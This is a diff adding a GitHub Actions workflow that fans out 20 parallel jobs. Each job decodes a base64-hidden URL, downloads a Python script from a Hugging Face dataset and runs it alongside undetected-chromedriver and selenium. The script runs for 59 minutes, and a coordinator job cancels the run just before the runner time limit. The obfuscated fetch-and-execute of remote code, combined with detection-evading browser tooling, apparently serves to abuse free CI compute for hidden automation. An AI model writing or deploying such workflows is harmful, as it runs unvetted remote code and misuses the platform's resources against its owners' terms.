@@ -1,0 +1,106 @@
+name: Silent Tempest Relay Bastion
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: tempest-bastion-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # المُنسّق الأزلي: يُطلق إشارة الإنهاء عند علامة 59 دقيقة بالضبط
+  # =================================================================
+  ageless-coordinator:
+    name: "Ageless Coordinator"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: Mount Coordinator Post
+        run: |
+          echo "[COORDINATOR] Ageless coordinator mounted. Post secured at the 59-minute edge."
+          echo "[COORDINATOR] Run stamp recorded: ${{ github.run_id }}"
+          
+          # فترة الترصّد المحددة (3540 ثانية = 59 دقيقة)
+          sleep 3540
+          
+          echo "[COORDINATOR] Edge touched! Unleashing coordinator order..."
+          
+          # إطلاق أمر الإلغاء عبر GitHub API
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[COORDINATOR] Order unleashed. Every running and queued tempest will be calmed."
+
+  # =================================================================
+  # حصن الترحيل المتوازي: بناء وتشغيل عُقد الحصن
+  # =================================================================
+  bastion-relays:
+    name: "BastionNode-${{ matrix.bastion_serial }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        bastion_serial: [1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المقطع ⟦1⟧: تأمين القاعدة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Secure Base
+        run: |
+          echo "[SECURE] Securing base for BastionNode-${{ matrix.bastion_serial }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المقطع ⟦2⟧: استجلاب الشيفرة الأساسية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Obtain Core Script
+        run: |
+          echo "[OBTAIN] Obtaining tempest_core.py from assigned origin..."
+          ORIGIN_LINK=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$ORIGIN_LINK" -o tempest_core.py
+          echo "[OBTAIN] Core script obtained."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المقطع ⟦3⟧: تجهيز المرافق
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Equip Amenities
+        run: |
+          echo "[EQUIP] Equipping amenities..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ المقطع ⟦4⟧: التنفيذ المقيّد بـ 59 دقيقة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Release Tempest Burst
+        run: |
+          echo ">> Releasing BastionNode-${{ matrix.bastion_serial }} burst..."
+          
+          # تشغيل العملية في الخلفية
+          python3 tempest_core.py &
+          BASTION_PID=$!
+          
+          echo ">> Tempest burst released. Cutoff: 59 minutes (3540s)."
+          
+          # الانتظار حتى انتهاء المدة المحددة (59 دقيقة بالضبط)
+          sleep 3540
+          
+          # فحص حالة العملية وإنهاؤها إن كانت لا تزال تعمل
+          if kill -0 $BASTION_PID 2>/dev/null; then
+            echo ">> Cutoff hit! Damping burst..."
+            kill -9 $BASTION_PID
+            echo ">> Burst damped by cutoff guardian."
+          else
+            echo ">> Burst settled within cutoff."
+          fi
